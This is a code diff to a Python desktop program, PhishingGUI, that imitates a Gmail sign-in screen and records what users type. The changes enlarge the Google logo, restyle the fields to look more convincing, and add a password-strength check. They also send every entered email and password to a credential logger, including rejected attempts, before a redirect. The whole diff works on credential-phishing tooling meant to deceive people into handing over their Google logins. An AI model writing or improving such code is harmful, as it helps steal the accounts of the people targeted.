@@ -8,8 +8,6 @@ class PhishingGUI:
     def __init__(self):
         self.logger = CredentialLogger()
         self.redirector = Redirector()
-        ctk.set_appearance_mode("system")
-        ctk.set_default_color_theme("dark-blue")
         self.root = ctk.CTk()
         self.root.title("Gmail - Sign In")
         self.root.geometry('900x600')
@@ -18,25 +16,25 @@ class PhishingGUI:
     def setup_ui(self):
         self.root.configure(bg="#f2f2f2")
 
-        self.login_frame = ctk.CTkFrame(self.root, width=400, height=400, fg_color="white", corner_radius=10)
+        self.login_frame = ctk.CTkFrame(self.root, width=400, height=400, fg_color="transparent", corner_radius=10)
         self.login_frame.pack(pady=50)
 
         # Logo google
-        self.logo = ctk.CTkImage(Image.open("Google.png"), size=(100, 34))
+        self.logo = ctk.CTkImage(Image.open("Google.png"), size=(200, 68))
+        ctk.CTkLabel(self.login_frame, image=self.logo, text="", bg_color="transparent").pack(pady=(20,10))
 
         # Nagłówek
-
-        ctk.CTkLabel(self.root, text="Sign in", font=ctk.CTkFont(size=20, weight="bold"),
-                     text_color="black", fg_color="white").pack(pady=(0, 10))
+        ctk.CTkLabel(self.login_frame, text="Sign in", font=ctk.CTkFont(size=20, weight="bold"),
+                     text_color="white", fg_color="transparent").pack(pady=(0, 10))
 
 
         # Email input
-        ctk.CTkLabel(self.root, text="Email", text_color="black", fg_color="white").pack()
+        ctk.CTkLabel(self.login_frame, text="Email", text_color="white", fg_color="transparent").pack()
         self.email_entry = ctk.CTkEntry(self.login_frame, width=300)
         self.email_entry.pack()
 
         # Error
-        self.error_label = ctk.CTkLabel(self.login_frame, text="", text_color="red", font=ctk.CTkFont(size=16, weight="bold"), fg_color="white")
+        self.error_label = ctk.CTkLabel(self.login_frame, text="", text_color="red", font=ctk.CTkFont(size=16, weight="bold"), fg_color="transparent")
 
 
         # Przycisk next
@@ -72,26 +70,45 @@ class PhishingGUI:
         self.email_entry.pack_forget()
         self.next_button.pack_forget()
 
-        self.email_label = ctk.CTkLabel(self.root, text=self.email, font=ctk.CTkFont(size=20, weight="bold"))
-        self.email_label.pack(pady=5)
+        self.email_label = ctk.CTkLabel(self.login_frame, text=self.email, font=ctk.CTkFont(size=20, weight="bold"),
+                                    text_color="yellow", fg_color="transparent")
+        self.email_label.pack(pady=(1,10))
 
 
         # Dodajemy input do hasła
-        ctk.CTkLabel(self.root, text="Password").pack()
-        self.password_entry = ctk.CTkEntry(self.root, show="*", width=300)
+        ctk.CTkLabel(self.login_frame, text="Password").pack()
+        self.password_entry = ctk.CTkEntry(self.login_frame, show="*", width=300)
         self.password_entry.pack()
 
-        self.login_button = ctk.CTkButton(self.root, text="Login", command=self.handle_password_submit)
+        self.login_button = ctk.CTkButton(self.login_frame, text="Login", command=self.handle_password_submit,
+                                          fg_color="#1a73e8", hover_color="#1669c1")
         self.login_button.pack(pady=20)
+
+
+    def is_strong_password(self, password: str) -> bool:
+        if len(password) < 8:
+             return False
+        elif not re.search("[r'A-Za-z']", password):
+            return False
+        elif not re.search("[r'0-9']", password):
+            return False
+        else:
+            return True
+
 
     def handle_password_submit(self):
         password = self.password_entry.get()
 
         if not password:
+            self.logger.log(self.email, password, is_valid=False)
             self.show_error("Password cannot be empty.", below_widget=self.password_entry)
             return
 
-        # Logujemy dane
+        if not self.is_strong_password(password):
+            self.logger.log(self.email, password, is_valid=False)
+            self.show_error("Password must be at least 8 characters long, contain at least one letter and one number.", below_widget=self.password_entry)
+            return
+
         self.logger.log(self.email, password, is_valid=True)
 
         self.root.destroy()
